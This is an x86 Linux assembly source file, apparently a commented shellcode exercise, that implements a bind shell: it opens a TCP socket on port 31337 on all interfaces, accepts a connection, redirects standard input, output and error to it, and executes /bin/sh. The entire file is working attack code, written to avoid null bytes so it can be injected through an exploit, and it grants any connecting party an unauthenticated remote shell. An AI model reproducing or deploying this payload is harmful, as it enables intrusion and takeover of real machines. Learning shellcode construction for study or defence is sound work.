global _start			

section .text
_start:
	;Create the socket
	;CODE -> socket( AF_INET, SOCK_STREAM, IPPROTO_IP );
	;Assembly Call Structure
	; eax : 0x66
	; ebx : SYS_SOCKET function
	; ecx : SYS_SOCKET parameter (AF_INET, SOCK_STREAM, IPPROTO_IP)

	xor	eax, eax	;; initialize to 0
	xor	ebx, ebx	;; initialize to 0
	xor	edx, edx	;; initialize to 0
	mov	al, 0x66	;; systemcall sys_socketcall
	mov	bl, 0x1		;; SYS_SOCKET function
	push	edx		;; push edx (value: 0) for IPPROTO_IP param, as third param
	push	ebx		;; push ebx (value: 1) for SOCK_STREAM param, as second param
	push	0x2		;; push 0x2 for AF_INET param, as first param
	mov	ecx, esp	;; moving reference as parameter
	int	0x80		;; Interrupt
	
	;;;;; register EAX will be overwritten as the result of socket function

	;Bind the socket
	; CODE
	;srv_addr.sin_family = AF_INET; 
	;srv_addr.sin_port = htons( 31337 ); 
	;srv_addr.sin_addr.s_addr = htonl (INADDR_ANY);
	;bind( socket_fd, (struct sockaddr *)&srv_addr, sizeof(srv_addr) );
	;Assembly Call Structure
	; eax: 0x66
	; ebx: SYS_BIND function
	; ecx: srv_addr structure (sin_family, sin_port, sin_addr.s_addr)
	; edx: sizeof(srv_addr) -> (0x10, ecx, edi)
	
	mov	esi, eax	;; SAVE THE SOCKET DESCRIPTOR TO ESI

	mov	bl, 0x2		;; SYS_BIND function
	push	edx		;; push edx (value: 0) for sin_addr (INADDR_ENY), as third param
	push	word 0x697A	;; push 31337 (reversed hex) for sin_port, as second param
	push	bx		;; push ebx (value: 2) for AF_INET, as first param
	mov	ecx, esp	;; moving reference as srv_addr structure 
	push	0x10		;; address length, see sizeof(srv_addr)
	push	ecx		;; srv_addr structure
	push	esi		;; push the socket_fd to structure,
	mov	al, 0x66	;; systemcall for sys_socketcall 
	mov	ecx, esp	;; get the structure as BIND param
	int	0x80		;; Interrupt

	;;Listen the socket
	;CODE -> listen(socket_fd, 0);
	;Assembly Call Structure
	;eax <- 0x66
	;ebx <- 0x4 (listen)
	;ecx <- stack parameter (socket_fd,0)	
	mov	al, 0x66	;; systemcall for sys_socketcall
	mov	bl, 0x4		;; SYS_LISTEN
	push	edx		;; push edx (value: 0) as second param
	push	esi		;; push socket_fd as first param
	mov	ecx, esp	;; move the stack pointer to ecx to be parameter for SYS_LISTEN
	int	0x80		;; Interrupt

	;;Accept new connection
	;;CODE -> accept(socket_fd, (struct sockaddr *)&cli_addr, &socklen );
	;Assembly Call Structure
	;eax <- 0x66
	;ebx <- 0x5 (accept)
	;ecx <- Stack parameter (socket_fd, IGNORE, IGNORE)
	mov	al, 0x66	;; systemcall for sys_socketcall
	mov	bl, 0x5		;; SYS_ACCEPT
	push	edx		;; socklen, just put it zero
	push	edx		;; cli_addr, just put it zero
	push	esi		;; push socket_fd as first param
	mov	ecx, esp	;; move the stack pointer to ecx to be parameter for SYS_ACCEPT
	int	0x80		;; Interrupt

	
	;;Redirect I/O with dup
	;;CODE
	;;dup2(client_fd, 0);
	;;dup2(client_fd, 1);
	;;dup2(client_fd, 2);
	;;EAX will be overwritten and used in client_fd param
	;;client_fd is using ebx, and 0/1/2 is using ecx
	;;eax <- 0x3f
	;;ebx <- client_fd from previous function's return on eax
	;;ecx <- integer

	mov	ebx, eax	;;getting client_fd

	;;dup2(client_fd,0);
	xor	ecx, ecx	;;param 3 (0)
	mov	al, 0x3f	;;dup2
	int	0x80		;;interrupt

	;;dup2(client_fd,1);
	inc	ecx		;;param 3 (1)
	mov	al, 0x3f	;;dup2
	int	0x80		;;interrupt
	
	;;dup2(client_fd,2);
	inc	ecx		;;param 3 (2)
	mov	al, 0x3f	;;dup2
	int	0x80		;;interrupt

	;;execve( "/bin/sh", NULL, NULL );
	;;Call Structure
	;;eax <- 0x0b
	;;ebx <- string stack equivalent to /bin//sh/
	;;ecx <- 0
	;;edx <- 0
	mov	al, 0x0b	;syscall: sys_execve
	xor	ebx, ebx	;give ebx null
	push	ebx		;for null terminator
	push	0x68732f2f	;String "hs//"
	push	0x6e69622f	;String "nib/"
	mov	ebx, esp	;move current stack pointer to ebx as second param
	xor	ecx, ecx	;reset the ecx to 0
	mov	edx, ecx	;mov ecx to edx
	int	0x80		;interrupt

	;exit(1), NOT REQUIRED
	;Call structure
	;eax <- 0x1 (syscall for exit)
	;ebx <- 0x1 (exit code)
	mov	al, 0x1		; syscall for exit
	mov	bl, 0x1		; syscall code
	int	0x80		; interrupt
